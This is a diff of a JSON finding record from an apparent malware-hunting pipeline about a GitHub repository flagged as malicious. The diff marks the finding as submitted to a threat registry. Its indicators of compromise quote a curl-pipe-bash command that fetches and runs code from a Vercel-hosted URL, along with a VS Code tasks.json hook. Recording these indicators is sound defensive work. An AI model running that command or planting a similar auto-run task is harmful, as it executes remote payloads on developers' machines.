@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:dawit212119/bus-admin",
     "kind": "repository",
+    "family": "",
     "id": "dawit212119/bus-admin",
     "url": "https://github.com/Dawit212119/BUS-ADMIN",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; frontend/.vscode/tasks.json",
     "matched_signatures": "settings/linux?flag=",
     "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag='] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "b04260ef-decc-49a5-bb48-06f2696bbc9d",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/dawit212119_bus-admin.json",
